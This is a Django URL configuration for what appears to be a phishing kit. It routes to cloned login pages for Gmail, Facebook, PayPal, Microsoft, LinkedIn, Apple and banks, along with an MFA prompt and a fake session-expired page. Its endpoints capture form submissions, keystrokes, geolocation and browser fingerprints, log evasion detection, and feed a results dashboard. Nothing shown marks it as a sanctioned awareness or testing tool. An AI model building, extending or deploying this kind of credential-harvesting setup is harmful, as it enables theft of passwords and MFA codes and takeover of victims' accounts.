from django.urls import path
from . import views

app_name = 'base'

urlpatterns = [
    path('gmail/', views.TemplateView.as_view(template_name='gmail_clone.html')),
    path('facebook/', views.TemplateView.as_view(template_name='facebook_clone.html')),
    path('mfa/', views.TemplateView.as_view(template_name='mfa_prompt.html')),
    path('bank/', views.TemplateView.as_view(template_name='bank_clone.html')),
    path('paypal/', views.TemplateView.as_view(template_name='paypal_clone.html')),
    path('microsoft/', views.TemplateView.as_view(template_name='microsoft_clone.html')),
    path('linkedin/', views.TemplateView.as_view(template_name='linkedin_clone.html')),
    path('apple/', views.TemplateView.as_view(template_name='apple_clone.html')),
    path('custombank/', views.TemplateView.as_view(template_name='custom_bank_clone.html')),
    path('session_expired/', views.TemplateView.as_view(template_name='session_expired.html')),
    path('submit/', views.handle_submission),
    path('log_keystroke/', views.log_keystroke),
    path('log_geo/', views.log_geo),
    path('log_fingerprint/', views.log_fingerprint),
    path('log_evasion_detected/', views.log_evasion),
    path('dashboard/', views.view_logs),
    path('export_project/', views.export_project),    
]